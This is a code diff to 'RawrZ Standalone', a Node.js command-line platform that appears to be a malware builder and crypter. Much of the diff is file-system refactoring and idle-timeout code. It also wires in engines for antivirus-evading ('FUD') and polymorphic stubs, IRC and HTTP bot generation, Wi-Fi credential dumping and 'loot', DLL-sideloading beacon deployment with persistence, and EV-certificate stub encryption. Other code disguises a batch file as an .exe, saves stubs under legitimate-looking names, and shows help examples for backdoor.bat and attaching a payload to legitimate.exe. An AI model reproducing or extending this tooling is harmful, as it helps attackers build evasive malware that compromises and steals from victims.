@@ -3,12 +3,14 @@
 // Pure command-line security platform
 // Usage: node rawrz-standalone.js <command> [arguments]
 
-const fs = require('fs').promises;
+const fs = require('fs');
+const fsPromises = require('fs').promises;
 const path = require('path');
 const crypto = require('crypto');
 const { exec } = require('child_process');
 const { promisify } = require('util');
 const execAsync = promisify(exec);
+const cliAntiFreeze = require('./src/utils/cli-anti-freeze');
 const AdvancedCrypto = require('./src/engines/advanced-crypto');
 
 class RawrZStandalone {
@@ -34,20 +36,66 @@ class RawrZStandalone {
             'dual-generators': './src/engines/dual-generators',
             'health-monitor': './src/engines/health-monitor',
             'stealth-engine': './src/engines/stealth-engine',
-            'advanced-fud-engine': './src/engines/advanced-fud-engine'
+            'advanced-fud-engine': './src/engines/advanced-fud-engine',
+            'native-compiler': './src/engines/native-compiler',
+            'advanced-anti-analysis': './src/engines/advanced-anti-analysis',
+            'advanced-crypto': './src/engines/advanced-crypto',
+            'stub-generator': './src/engines/stub-generator',
+            'dual-crypto-engine': './src/engines/dual-crypto-engine',
+            'irc-bot-generator': './src/engines/irc-bot-generator',
+            'red-killer': './src/engines/red-killer',
+            'ev-cert-encryptor': './src/engines/ev-cert-encryptor',
+            'red-shells': './src/engines/red-shells',
+            'burner-encryption-engine': './src/engines/burner-encryption-engine',
+            'mutex-engine': './src/engines/mutex-engine',
+            'template-generator': './src/engines/template-generator',
+            'advanced-stub-generator': './src/engines/advanced-stub-generator',
+            'http-bot-generator': './src/engines/http-bot-generator',
+            'compression-engine': './src/engines/compression-engine',
+            'polymorphic-engine': './src/engines/polymorphic-engine',
+            'memory-manager': './src/engines/memory-manager',
+            'mobile-tools': './src/engines/mobile-tools',
+            'openssl-management': './src/engines/openssl-management',
+            'api-status': './src/engines/api-status',
+            'backup-system': './src/engines/backup-system',
+            'implementation-checker': './src/engines/implementation-checker',
+            'beaconism-dll-sideloading': './src/engines/beaconism-dll-sideloading'
         };
         this.initializeDirectories();
         this.setupLogging();
+        // Lazy loading - don't initialize systems until needed
+        this.previouslyLoadedEngines = new Set();
+        this.systemsInitialized = false;
+    }
+
+    // Initialize systems only when needed
+    async initializeSystemsIfNeeded() {
+        if (!this.systemsInitialized) {
+            console.log('[INFO] Initializing systems on demand...');
+            await this.loadEngineState();
+            this.initializeIdleTimeout();
+            this.systemsInitialized = true;
+            console.log('[INFO] Systems initialized');
+        }
+    }
+
+    // Async initialization method
+    async initialize() {
+        try {
+            await this.initializeDirectories();
+            this.setupLogging();
+            return { success: true, message: 'RawrZ Standalone initialized successfully' };
+        } catch (error) {
+            console.error('[ERROR] Failed to initialize RawrZ Standalone:', error.message);
+            return { success: false, error: error.message };
+        }
     }
 
     // Singleton pattern for persistent engine management
     static getInstance() {
         if (!RawrZStandalone.instance) {
             RawrZStandalone.instance = new RawrZStandalone();
-            // Load persisted engine state asynchronously
-            RawrZStandalone.instance.loadEngineState().catch(error => {
-                console.error('[ERROR] Failed to load engine state:', error.message);
-            });
+            // Lazy loading - don't load engines until needed
         }
         return RawrZStandalone.instance;
     }
@@ -56,7 +104,8 @@ class RawrZStandalone {
     static async getInstanceAsync() {
         if (!RawrZStandalone.instance) {
             RawrZStandalone.instance = new RawrZStandalone();
-            await RawrZStandalone.instance.loadEngineState();
+            await RawrZStandalone.instance.initialize();
+            // Lazy loading - only load engine state when needed
         }
         return RawrZStandalone.instance;
     }
@@ -64,15 +113,21 @@ class RawrZStandalone {
     // Save engine state to file for persistence
     async saveEngineState() {
         try {
+            console.log('[DEBUG] Starting to save engine state');
             const stateFile = path.join(this.dataDir, 'cli-engine-state.json');
+            console.log(`[DEBUG] State file path: ${stateFile}`);
+            
             const state = {
                 loadedEngines: Array.from(this.loadedEngines.keys()),
                 timestamp: new Date().toISOString()
             };
-            await fs.writeFile(stateFile, JSON.stringify(state, null, 2));
-            this.log('INFO', 'Engine state saved', { engines: state.loadedEngines });
+            console.log(`[DEBUG] State data: ${JSON.stringify(state)}`);
+            
+            await fsPromises.writeFile(stateFile, JSON.stringify(state, null, 2));
+            console.log('[INFO] Engine state saved');
         } catch (error) {
-            this.log('ERROR', 'Failed to save engine state', { error: error.message });
+            console.log(`[ERROR] Failed to save engine state: ${error.message}`);
+            console.log(`[DEBUG] Save state error stack: ${error.stack}`);
         }
     }
 
@@ -80,52 +135,25 @@ class RawrZStandalone {
     async loadEngineState() {
         try {
             const stateFile = path.join(this.dataDir, 'cli-engine-state.json');
-            const stateData = await fs.readFile(stateFile, 'utf8');
+            const stateData = await fsPromises.readFile(stateFile, 'utf8');
             const state = JSON.parse(stateData);
             
-            this.log('INFO', 'Found engine state file, restoring engines...', { engines: state.loadedEngines });
+            console.log('[INFO] Found engine state file, preparing lazy loading...');
             
-            // Actually load the previously loaded engines
-            for (const engineName of state.loadedEngines) {
-                if (this.availableEngines[engineName]) {
-                    try {
-                        // Check if engine is already loaded to avoid duplicates
-                        if (!this.loadedEngines.has(engineName)) {
-                            const EngineModule = require(this.availableEngines[engineName]);
-                            const engine = typeof EngineModule === 'function' ? new EngineModule() : EngineModule;
-                            
-                            if (typeof engine.initialize === 'function') {
-                                await engine.initialize();
-                            }
-                            
-                            this.loadedEngines.set(engineName, engine);
-                            this.log('INFO', `Restored engine: ${engineName}`);
-                        } else {
-                            this.log('INFO', `Engine ${engineName} already loaded, skipping restore`);
-                        }
-                    } catch (error) {
-                        this.log('WARN', `Failed to restore engine ${engineName}: ${error.message}`);
-                    }
-                } else {
-                    this.log('WARN', `Engine ${engineName} no longer available, skipping restore`);
-                }
-            }
-            
-            this.log('INFO', 'Engine state restored', { 
-                requested: state.loadedEngines.length,
-                restored: this.loadedEngines.size,
-                timestamp: state.timestamp 
-            });
+            // Store engine names for lazy loading instead of loading immediately
+            this.previouslyLoadedEngines = new Set(state.loadedEngines);
+            console.log(`[INFO] Prepared ${this.previouslyLoadedEngines.size} engines for lazy loading`);
         } catch (error) {
             // No state file exists or error reading it - this is normal for first run
-            this.log('INFO', 'No previous engine state found - starting fresh');
+            console.log('[INFO] No previous engine state found - starting fresh');
+            this.previouslyLoadedEngines = new Set();
         }
     }
 
     // Rebuild platform state - clear and reload all engines
     async rebuildPlatformState() {
         try {
-            this.log('INFO', 'Starting platform state rebuild...');
+            console.log('[INFO] Starting platform state rebuild...');
             
             // Clear current loaded engines
             this.loadedEngines.clear();
@@ -133,8 +161,8 @@ class RawrZStandalone {
             // Clear state file
             const stateFile = path.join(this.dataDir, 'cli-engine-state.json');
             try {
-                await fs.unlink(stateFile);
-                this.log('INFO', 'Cleared engine state file');
+                await fs.promises.unlink(stateFile);
+                console.log('[INFO] Cleared engine state file');
             } catch (error) {
                 // File might not exist, that's okay
             }
@@ -143,26 +171,23 @@ class RawrZStandalone {
             await this.initializeDirectories();
             
             // Reload default engines
-            const defaultEngines = ['anti-analysis', 'digital-forensics', 'network-tools'];
+            const defaultEngines = ['anti-analysis', 'digital-forensics', 'network-tools', 'advanced-crypto', 'health-monitor', 'stealth-engine'];
             for (const engineName of defaultEngines) {
                 if (this.availableEngines[engineName]) {
                     try {
                         await this.loadEngine(engineName);
-                        this.log('INFO', `Rebuilt engine: ${engineName}`);
+                        console.log(`[INFO] Rebuilt engine: ${engineName}`);
                     } catch (error) {
-                        this.log('WARN', `Failed to rebuild engine ${engineName}: ${error.message}`);
+                        console.log(`[WARN] Failed to rebuild engine ${engineName}: ${error.message}`);
                     }
                 }
             }
             
-            this.log('INFO', 'Platform state rebuild completed', { 
-                engines: this.loadedEngines.size,
-                available: Object.keys(this.availableEngines).length 
-            });
+            console.log('[INFO] Platform state rebuild completed');
             
             return { success: true, engines: this.loadedEngines.size };
         } catch (error) {
-            this.log('ERROR', 'Platform state rebuild failed', { error: error.message });
+            console.log(`[ERROR] Platform state rebuild failed: ${error.message}`);
             throw error;
         }
     }
@@ -179,16 +204,16 @@ class RawrZStandalone {
         };
         
         const sessionFile = path.join(this.dataDir, `session_${id}.json`);
-        await fs.writeFile(sessionFile, JSON.stringify(session, null, 2));
+        await fsPromises.writeFile(sessionFile, JSON.stringify(session, null, 2));
         
-        this.log('INFO', 'Session created', { sessionId: id });
+        console.log(`[INFO] Session created: ${id}`);
         return session;
     }
 
     async restoreSession(sessionId) {
         try {
             const sessionFile = path.join(this.dataDir, `session_${sessionId}.json`);
-            const sessionData = await fs.readFile(sessionFile, 'utf8');
+            const sessionData = await fs.promises.readFile(sessionFile, 'utf8');
             const session = JSON.parse(sessionData);
             
             // Clear current state
@@ -199,54 +224,50 @@ class RawrZStandalone {
                 if (this.availableEngines[engineName]) {
                     try {
                         await this.loadEngine(engineName);
-                        this.log('INFO', `Restored engine from session: ${engineName}`);
+                        console.log(`[INFO] Restored engine from session: ${engineName}`);
                     } catch (error) {
-                        this.log('WARN', `Failed to restore engine from session ${engineName}: ${error.message}`);
+                        console.log(`[WARN] Failed to restore engine from session ${engineName}: ${error.message}`);
                     }
                 }
             }
             
-            this.log('INFO', 'Session restored', { 
-                sessionId,
-                engines: this.loadedEngines.size,
-                createdAt: session.createdAt 
-            });
+            console.log(`[INFO] Session restored: ${sessionId}`);
             
             return session;
         } catch (error) {
-            this.log('ERROR', 'Failed to restore session', { sessionId, error: error.message });
+            console.log(`[ERROR] Failed to restore session: ${error.message}`);
             throw error;
         }
     }
 
     async listSessions() {
         try {
-            const files = await fs.readdir(this.dataDir);
+            const files = await fsPromises.readdir(this.dataDir);
             const sessionFiles = files.filter(file => file.startsWith('session_') && file.endsWith('.json'));
             const sessions = [];
             
             for (const file of sessionFiles) {
                 try {
-                    const sessionData = await fs.readFile(path.join(this.dataDir, file), 'utf8');
+                    const sessionData = await fs.promises.readFile(path.join(this.dataDir, file), 'utf8');
                     const session = JSON.parse(sessionData);
                     sessions.push(session);
                 } catch (error) {
-                    this.log('WARN', `Failed to read session file ${file}: ${error.message}`);
+                    console.log(`[WARN] Failed to read session file ${file}: ${error.message}`);
                 }
             }
             
             return sessions.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
         } catch (error) {
-            this.log('ERROR', 'Failed to list sessions', { error: error.message });
+            console.log(`[ERROR] Failed to list sessions: ${error.message}`);
             return [];
         }
     }
 
     async initializeDirectories() {
         try {
-            await fs.mkdir(this.uploadDir, { recursive: true });
-            await fs.mkdir(this.dataDir, { recursive: true });
-            await fs.mkdir(this.logsDir, { recursive: true });
+            await fs.promises.mkdir(this.uploadDir, { recursive: true });
+            await fs.promises.mkdir(this.dataDir, { recursive: true });
+            await fs.promises.mkdir(this.logsDir, { recursive: true });
         } catch (error) {
             console.log('[ERROR] Failed to create directories:', error.message);
         }
@@ -271,10 +292,14 @@ class RawrZStandalone {
             // Console output
             console.log(`[${level}] ${message}`);
             
-            // File logging (async)
-            fs.appendFile(this.logFile, logLine).catch(err => {
-                console.error(`[ERROR] Logging failed: ${err.message}`);
-            });
+            // File logging (async) - only if logFile is defined
+            if (this.logFile) {
+                fs.appendFile(this.logFile, logLine, (err) => {
+                    if (err) {
+                        console.error(`[ERROR] Logging failed: ${err.message}`);
+                    }
+                });
+            }
         };
     }
 
@@ -397,7 +422,7 @@ class RawrZStandalone {
                     size: data.length
                 };
                 
-                await fs.writeFile(filePath, JSON.stringify(hashData, null, 2));
+                await fs.promises.writeFile(filePath, JSON.stringify(hashData, null, 2));
                 console.log(`[OK] Hash saved to: ${filename}`);
                 return { success: true, hash, algorithm, filename };
             }
@@ -433,7 +458,7 @@ class RawrZStandalone {
                     type: algorithm.toLowerCase().includes('rsa') ? 'keypair' : 'symmetric'
                 };
                 
-                await fs.writeFile(filePath, JSON.stringify(keyData, null, 2));
+                await fs.promises.writeFile(filePath, JSON.stringify(keyData, null, 2));
                 console.log(`[OK] Key saved to: ${filename}`);
                 return { success: true, key, algorithm, length, filename };
             }
@@ -470,7 +495,7 @@ class RawrZStandalone {
                     result: result
                 };
                 
-                await fs.writeFile(filePath, JSON.stringify(pingData, null, 2));
+                await fs.promises.writeFile(filePath, JSON.stringify(pingData, null, 2));
                 console.log(`[OK] Ping results saved to: ${filename}`);
                 return { success: true, host, result, filename };
             }
@@ -543,7 +568,7 @@ class RawrZStandalone {
     // File Operations
     async listFiles() {
         try {
-            const files = await fs.readdir(this.uploadDir);
+            const files = await fsPromises.readdir(this.uploadDir);
             console.log(`[OK] Files in uploads directory:`);
             files.forEach(file => {
                 console.log(`[FILE] ${file}`);
@@ -559,7 +584,7 @@ class RawrZStandalone {
         try {
             const data = Buffer.from(base64Data, 'base64');
             const filePath = path.join(this.uploadDir, filename);
-            await fs.writeFile(filePath, data);
+            await fs.promises.writeFile(filePath, data);
             console.log(`[OK] File uploaded: ${filename} (${data.length} bytes)`);
             return { success: true, filename, size: data.length };
         } catch (error) {
@@ -1033,7 +1058,7 @@ class RawrZStandalone {
         try {
             switch (operation) {
                 case 'copy':
-                    await fs.copyFile(input, output);
+                    await fs.promises.copyFile(input, output);
                     console.log(`[OK] File copied: ${input} -> ${output}`);
                     break;
                 case 'move':
@@ -1041,11 +1066,11 @@ class RawrZStandalone {
                     console.log(`[OK] File moved: ${input} -> ${output}`);
                     break;
                 case 'delete':
-                    await fs.unlink(input);
+                    await fs.promises.unlink(input);
                     console.log(`[OK] File deleted: ${input}`);
                     break;
                 case 'info':
-                    const stats = await fs.stat(input);
+                    const stats = await fs.promises.stat(input);
                     console.log(`[OK] File info for ${input}:`);
                     console.log(`[OK] Size: ${stats.size} bytes`);
                     console.log(`[OK] Created: ${stats.birthtime}`);
@@ -1253,7 +1278,7 @@ class RawrZStandalone {
             throw new Error('Path traversal not allowed');
         }
         
-        const data = await fs.readFile(resolvedPath);
+        const data = await fs.promises.readFile(resolvedPath);
         
         const maxSize = 100 * 1024 * 1024;
         if (data.length > maxSize) {
@@ -1265,7 +1290,7 @@ class RawrZStandalone {
 
     async readLocalFile(filename) {
         const filePath = path.join(this.uploadDir, filename);
-        const data = await fs.readFile(filePath);
+        const data = await fs.promises.readFile(filePath);
         
         const maxSize = 100 * 1024 * 1024;
         if (data.length > maxSize) {
@@ -1316,8 +1341,13 @@ class RawrZStandalone {
             encrypted = Buffer.concat([encrypted, cipher.final()]);
             
             // Get auth tag for authenticated encryption modes
-            if (cipher.getAuthTag) {
-                authTag = cipher.getAuthTag();
+            if (cipher.getAuthTag && typeof cipher.getAuthTag === 'function') {
+                try {
+                    authTag = cipher.getAuthTag();
+                } catch (error) {
+                    // Auth tag not supported for this cipher mode
+                    authTag = null;
+                }
             }
         } catch (error) {
             console.error(`[ERROR] Encryption failed with ${algorithm}:`, error.message);
@@ -1533,7 +1563,7 @@ class RawrZStandalone {
                 data: result.data ? result.data.toString('base64') : result.data
             };
             
-            await fs.writeFile(filePath, JSON.stringify(output, null, 2));
+            await fs.promises.writeFile(filePath, JSON.stringify(output, null, 2));
         }
         
         return filename;
@@ -1605,7 +1635,7 @@ echo Use RawrZ decrypt command to decrypt this file
 pause`;
         }
         
-        await fs.writeFile(filePath, wrapperContent);
+        await fs.promises.writeFile(filePath, wrapperContent);
     }
 
     async createScriptWrapper(result, algorithm, filePath, extension) {
@@ -1684,7 +1714,7 @@ echo ""
 echo "Use RawrZ decrypt command to decrypt this file"`;
         }
         
-        await fs.writeFile(filePath, scriptContent);
+        await fs.promises.writeFile(filePath, scriptContent);
     }
 
     async saveDecryptedFile(data, algorithm, extension = '.bin') {
@@ -1692,7 +1722,7 @@ echo "Use RawrZ decrypt command to decrypt this file"`;
         const filename = `decrypted_${algorithm}_${timestamp}${extension}`;
         const filePath = path.join(this.uploadDir, filename);
         
-        await fs.writeFile(filePath, data);
+        await fs.promises.writeFile(filePath, data);
         return filename;
     }
 
@@ -1701,8 +1731,11 @@ echo "Use RawrZ decrypt command to decrypt this file"`;
         const command = args[0];
         const commandArgs = args.slice(1);
 
+        // Initialize systems only when needed
+        await this.initializeSystemsIfNeeded();
+
         this.operationCount++;
-        this.log('INFO', `Processing command: ${command}`, { args: commandArgs });
+        console.log(`[INFO] Processing command: ${command}`);
 
         console.log(`[OK] Processing command: ${command}`);
         console.log(`[OK] Arguments: ${Array.isArray(commandArgs) ? commandArgs.join(' ') : commandArgs || 'none'}`);
@@ -2829,26 +2862,70 @@ echo "Use RawrZ decrypt command to decrypt this file"`;
                     return `[ERROR] System Status\n[INFO] Error: ${error.message}`;
                 }
 
+            case 'idle':
+                if (commandArgs.length < 1) {
+                    console.log('[ERROR] Usage: idle <action> [options]');
+                    console.log('[INFO] Actions: enable, disable, status, reset');
+                    console.log('[INFO] Options: --timeout=<ms> --auto-reset=true|false');
+                    console.log('[INFO] Example: idle enable --timeout=300000 --auto-reset=true');
+                    console.log('[INFO] Example: idle disable');
+                    console.log('[INFO] Example: idle status');
+                    return;
+                }
+                return await this.idleCommand(commandArgs[0], commandArgs.slice(1));
+
+            case 'reset':
+                console.log('[INFO] Resetting CLI...');
+                this.resetCLI();
+                console.log('[OK] CLI reset completed');
+                return { success: true };
+
+            case 'redshells':
+                if (commandArgs.length < 1) {
+                    console.log('[ERROR] Usage: redshells <action> [options]');
+                    console.log('[INFO] Actions: create, execute, list, history, terminate, status, stats');
+                    return;
+                }
+                return await this.redShellsCommand(commandArgs[0], commandArgs.slice(1));
+
+            case 'evcert':
+                if (commandArgs.length < 1) {
+                    console.log('[ERROR] Usage: evcert <action> [options]');
+                    console.log('[INFO] Actions: generate, encrypt-stub, list-certs, list-stubs, templates, languages, algorithms');
+                    return;
+                }
+                return await this.evCertCommand(commandArgs[0], commandArgs.slice(1));
+
+            case 'redkill':
+                if (commandArgs.length < 1) {
+                    console.log('[ERROR] Usage: redkill <action> [options]');
+                    console.log('[INFO] Actions: detect, execute, extract, wifi-dump, loot, kills, patterns');
+                    return;
+                }
+                return await this.redKillerCommand(commandArgs[0], commandArgs.slice(1));
+
+            case 'beaconism':
+                if (commandArgs.length < 1) {
+                    console.log('[ERROR] Usage: beaconism <action> [options]');
+                    console.log('[INFO] Actions: generate, deploy, list, status, stats, targets, architectures, persistence, platforms, vectors');
+                    return;
+                }
+                return await this.beaconismCommand(commandArgs[0], commandArgs.slice(1));
+
             default:
                 this.errorCount++;
-                this.log('ERROR', `Unknown command: ${command}`);
+                console.log(`[ERROR] Unknown command: ${command}`);
                 console.log(`[ERROR] Unknown command: ${command}`);
                 this.showHelp();
                 return;
         }
         
         // Log successful command completion
-        this.log('INFO', `Command completed successfully: ${command}`);
+        console.log(`[INFO] Command completed successfully: ${command}`);
         
         } catch (error) {
             this.errorCount++;
-            this.log('ERROR', `Command failed: ${command}`, { 
-                error: error.message, 
-                stack: error.stack,
-                command: command,
-                args: commandArgs,
-                timestamp: new Date().toISOString()
-            });
+            console.log(`[ERROR] Command failed: ${command} - ${error.message}`);
             console.log(`[ERROR] Command execution failed: ${error.message}`);
             console.log(`[ERROR] Stack trace: ${error.stack}`);
             return { success: false, error: error.message, stack: error.stack };
@@ -2957,7 +3034,7 @@ echo "Use RawrZ decrypt command to decrypt this file"`;
                 // Save source code with legitimate name
                 const filename = outputPath || this.generateLegitimateFilename(framework);
                 const filepath = path.join(this.uploadDir, filename);
-                await fs.writeFile(filepath, stubCode);
+                await fs.promises.writeFile(filepath, stubCode);
 
                 console.log(`[OK] Native stub generated: ${filename}`);
                 console.log(`[OK] Compilation instructions:`);
@@ -3042,7 +3119,7 @@ echo "Use RawrZ decrypt command to decrypt this file"`;
             // Save stub file with legitimate name
             const filename = outputPath || this.generateLegitimateFilename('csharp');
             const filepath = path.join(this.uploadDir, filename);
-            await fs.writeFile(filepath, stubCode);
+            await fs.promises.writeFile(filepath, stubCode);
 
             console.log(`[OK] .NET stub generated: ${filename}`);
             console.log(`[OK] Compilation instructions:`);
@@ -3119,7 +3196,7 @@ echo "Use RawrZ decrypt command to decrypt this file"`;
             const nasmAvailable = await this.checkNasmAvailability();
             if (!nasmAvailable) {
                 // Fallback: Create a simple executable wrapper
-                return await this.createExecutableWrapper(asmPath, outputPath);
+                return await this.createAssemblyWrapper(asmPath, outputPath);
             }
 
             // Use NASM to compile
@@ -3134,7 +3211,7 @@ echo "Use RawrZ decrypt command to decrypt this file"`;
                 console.log(`[OK] Object file created: ${path.basename(objPath)}`);
             } catch (nasmError) {
                 console.log(`[WARN] NASM compilation failed, using fallback method`);
-                return await this.createExecutableWrapper(asmPath, outputPath);
+                return await this.createAssemblyWrapper(asmPath, outputPath);
             }
 
             // Link to executable
@@ -3147,7 +3224,7 @@ echo "Use RawrZ decrypt command to decrypt this file"`;
             } catch (linkError) {
                 // Fallback: Create executable wrapper
                 console.log(`[WARN] Linker failed, using fallback method`);
-                return await this.createExecutableWrapper(asmPath, outputPath);
+                return await this.createAssemblyWrapper(asmPath, outputPath);
             }
 
             // Clean up object file
@@ -3275,19 +3352,19 @@ echo "Use RawrZ decrypt command to decrypt this file"`;
         }
     }
 
-    async createExecutableWrapper(asmPath, outputPath) {
+    async createAssemblyWrapper(asmPath, outputPath) {
         try {
             console.log(`[OK] Creating executable wrapper for assembly file`);
             
             // Read the assembly file
-            const asmContent = await fs.readFile(asmPath, 'utf8');
+            const asmContent = await fs.promises.readFile(asmPath, 'utf8');
             
             // Create a PowerShell wrapper that can execute the assembly
             const wrapperContent = this.createPowerShellWrapper(asmContent, path.basename(asmPath));
             
             // Save as .ps1 first
             const psPath = outputPath.replace('.exe', '.ps1');
-            await fs.writeFile(psPath, wrapperContent);
+            await fs.promises.writeFile(psPath, wrapperContent);
             
             // Create a batch file to execute the PowerShell script
             const batchContent = `@echo off
@@ -3295,7 +3372,7 @@ powershell.exe -ExecutionPolicy Bypass -File "${psPath}"
 pause`;
             
             const batchPath = outputPath.replace('.exe', '.bat');
-            await fs.writeFile(batchPath, batchContent);
+            await fs.promises.writeFile(batchPath, batchContent);
             
             // Copy batch file as .exe (Windows will execute .bat files even with .exe extension)
             await fs.copyFile(batchPath, outputPath);
@@ -3368,7 +3445,7 @@ pause`;
             console.log(`[OK] Output file: ${outputFilename}`);
 
             // Read the JavaScript file
-            const jsContent = await fs.readFile(jsPath, 'utf8');
+            const jsContent = await fs.promises.readFile(jsPath, 'utf8');
             
             // Create appropriate wrapper based on format
             let wrapperContent;
@@ -3391,7 +3468,7 @@ pause`;
             }
             
             // Save the wrapper
-            await fs.writeFile(outputPath, wrapperContent);
+            await fs.promises.writeFile(outputPath, wrapperContent);
             
             const stats = await fs.stat(outputPath);
             console.log(`[OK] JavaScript compiled successfully: ${outputFilename}`);
@@ -3936,7 +4013,7 @@ WScript.StdIn.ReadLine()
     async compileStubToExe(stubCode, framework, outputPath) {
         try {
             const tempSourcePath = path.join(this.uploadDir, `temp_${Date.now()}.${framework === 'cpp' ? 'cpp' : 'asm'}`);
-            await fs.writeFile(tempSourcePath, stubCode);
+            await fs.promises.writeFile(tempSourcePath, stubCode);
             
             if (framework === 'cpp') {
                 // Compile C++ to executable
@@ -3976,7 +4053,7 @@ WScript.StdIn.ReadLine()
                 targetData
             ]);
             
-            await fs.writeFile(outputPath, combinedData);
+            await fs.promises.writeFile(outputPath, combinedData);
             console.log(`[OK] Stub attached to: ${path.basename(targetFile)}`);
         } catch (error) {
             console.log(`[ERROR] File attachment failed: ${error.message}`);
@@ -4067,7 +4144,7 @@ process.exit(0);`;
                     scriptContent = stubCode;
             }
             
-            await fs.writeFile(scriptPath, scriptContent);
+            await fs.promises.writeFile(scriptPath, scriptContent);
             console.log(`[OK] Script stub created: ${path.basename(scriptPath)}`);
         } catch (error) {
             console.log(`[ERROR] Script generation failed: ${error.message}`);
@@ -4209,6 +4286,8 @@ namespace RawrZStub
 
     async loadEngine(engineName) {
         try {
+            console.log(`[DEBUG] Starting to load engine: ${engineName}`);
+            
             if (this.loadedEngines.has(engineName)) {
                 console.log(`[WARN] Engine ${engineName} is already loaded`);
                 return { success: true, message: `Engine ${engineName} already loaded` };
@@ -4219,22 +4298,33 @@ namespace RawrZStub
                 return { success: false, error: `Engine ${engineName} not found` };
             }
 
+            console.log(`[DEBUG] Requiring engine module: ${this.availableEngines[engineName]}`);
             const EngineModule = require(this.availableEngines[engineName]);
+            console.log(`[DEBUG] Engine module loaded, type: ${typeof EngineModule}`);
+            
             const engine = typeof EngineModule === 'function' ? new EngineModule() : EngineModule;
+            console.log(`[DEBUG] Engine instance created: ${engine.constructor ? engine.constructor.name : 'Unknown'}`);
             
             if (typeof engine.initialize === 'function') {
+                console.log(`[DEBUG] Calling engine.initialize() for ${engineName}`);
                 await engine.initialize();
+                console.log(`[DEBUG] Engine.initialize() completed for ${engineName}`);
+            } else {
+                console.log(`[DEBUG] Engine ${engineName} has no initialize method`);
             }
             
             this.loadedEngines.set(engineName, engine);
             console.log(`[OK] Engine ${engineName} loaded successfully`);
             
             // Save state after successful load
+            console.log(`[DEBUG] Saving engine state after loading ${engineName}`);
             await this.saveEngineState();
+            console.log(`[DEBUG] Engine state saved successfully`);
             
             return { success: true, message: `Engine ${engineName} loaded successfully` };
         } catch (error) {
             console.log(`[ERROR] Failed to load engine ${engineName}: ${error.message}`);
+            console.log(`[DEBUG] Error stack: ${error.stack}`);
             return { success: false, error: error.message };
         }
     }
@@ -4413,10 +4503,642 @@ namespace RawrZStub
         console.log('  node rawrz-standalone.js stub script.ps1 --output=backdoor.bat --type=native');
         console.log('  node rawrz-standalone.js stub payload.exe --attach=legitimate.exe --type=native');
         console.log('');
-        console.log('Total Commands: 102+ Security Features');
+        console.log('Total Commands: 120+ Security Features');
         console.log('File Input Support: URLs, Local files, Absolute paths, Home directory');
         console.log('Custom Extensions: All applicable commands support custom file extensions');
         console.log('');
+    }
+
+    // Idle timeout and freeze detection methods
+    initializeIdleTimeout() {
+        // Idle timeout configuration
+        this.idleTimeoutEnabled = false;
+        this.idleTimeoutMs = 300000; // 5 minutes default
+        this.idleTimeoutId = null;
+        this.lastActivity = Date.now();
+        
+        // Auto-reset on idle (disabled by default)
+        this.autoResetOnIdle = false;
+        
+        // Freeze detection system
+        this.freezeDetectionEnabled = true;
+        this.freezeTimeoutMs = 60000; // 1 minute freeze detection
+        this.freezeDetectionId = null;
+        this.lastCommandTime = Date.now();
+        this.commandInProgress = false;
+        
+        // Start freeze detection
+        this.startFreezeDetection();
+        
+        console.log('[INFO] Idle timeout and freeze detection system initialized');
+    }
+
+    // Idle timeout control methods
+    enableIdleTimeout(timeoutMs = 300000, autoReset = false) {
+        this.idleTimeoutEnabled = true;
+        this.idleTimeoutMs = timeoutMs;
+        this.autoResetOnIdle = autoReset;
+        this.resetIdleTimer();
+        console.log(`[INFO] Idle timeout enabled: ${timeoutMs}ms, auto-reset: ${autoReset}`);
+    }
+
+    disableIdleTimeout() {
+        this.idleTimeoutEnabled = false;
+        if (this.idleTimeoutId) {
+            clearTimeout(this.idleTimeoutId);
+            this.idleTimeoutId = null;
+        }
+        console.log('[INFO] Idle timeout disabled');
+    }
+
+    resetIdleTimer() {
+        if (!this.idleTimeoutEnabled) return;
+        
+        this.lastActivity = Date.now();
+        
+        if (this.idleTimeoutId) {
+            clearTimeout(this.idleTimeoutId);
+        }
+        
+        this.idleTimeoutId = setTimeout(() => {
+            this.handleIdleTimeout();
+        }, this.idleTimeoutMs);
+    }
+
+    handleIdleTimeout() {
+        console.log(`[WARN] CLI idle for ${this.idleTimeoutMs}ms`);
+        
+        if (this.autoResetOnIdle) {
+            console.log('[INFO] Auto-resetting CLI due to idle timeout...');
+            this.resetCLI();
+        } else {
+            console.log('[INFO] CLI is idle. Use "reset" command to reset or "idle enable" to auto-reset');
+        }
+    }
+
+    resetCLI() {
+        console.log('[INFO] Resetting CLI...');
+        
+        // Clear loaded engines
+        this.loadedEngines.clear();
+        
+        // Reset counters
+        this.operationCount = 0;
+        this.errorCount = 0;
+        
+        // Reset idle timer
+        this.resetIdleTimer();
+        
+        console.log('[INFO] CLI reset completed');
+    }
+
+    // Freeze detection and recovery methods
+    startFreezeDetection() {
+        if (!this.freezeDetectionEnabled) return;
+        
+        this.freezeDetectionId = setInterval(() => {
+            this.checkForFreeze();
+        }, 10000); // Check every 10 seconds
+    }
+
+    stopFreezeDetection() {
+        if (this.freezeDetectionId) {
+            clearInterval(this.freezeDetectionId);
+            this.freezeDetectionId = null;
+        }
+    }
+
+    checkForFreeze() {
+        if (!this.commandInProgress) return;
+        
+        const timeSinceLastCommand = Date.now() - this.lastCommandTime;
+        
+        if (timeSinceLastCommand > this.freezeTimeoutMs) {
+            console.log(`[WARN] Potential freeze detected: ${timeSinceLastCommand}ms since last command`);
+            this.handleFreeze();
+        }
+    }
+
+    handleFreeze() {
+        console.log('[ERROR] CLI appears to be frozen - initiating auto-recovery...');
+        
+        // Force reset the CLI
+        this.forceResetCLI();
+        
+        console.log('[INFO] Auto-recovery completed - CLI reset and ready');
+    }
+
+    forceResetCLI() {
+        console.log('[INFO] Force resetting CLI due to freeze...');
+        
+        // Stop all timers
+        this.stopFreezeDetection();
+        this.disableIdleTimeout();
+        
+        // Clear loaded engines
+        this.loadedEngines.clear();
+        
+        // Reset counters
+        this.operationCount = 0;
+        this.errorCount = 0;
+        
+        // Reset command state
+        this.commandInProgress = false;
+        this.lastCommandTime = Date.now();
+        
+        // Restart freeze detection
+        this.startFreezeDetection();
+        
+        console.log('[INFO] Force reset completed');
+    }
+
+    markCommandStart() {
+        this.commandInProgress = true;
+        this.lastCommandTime = Date.now();
+        this.lastActivity = Date.now();
+        this.resetIdleTimer();
+    }
+
+    markCommandEnd() {
+        this.commandInProgress = false;
+        this.lastCommandTime = Date.now();
+        this.lastActivity = Date.now();
+        this.resetIdleTimer();
+    }
+
+    // Idle command handler
+    async idleCommand(action, args) {
+        try {
+            switch (action) {
+                case 'enable':
+                    const timeoutArg = args.find(arg => arg.startsWith('--timeout='));
+                    const autoResetArg = args.find(arg => arg.startsWith('--auto-reset='));
+                    
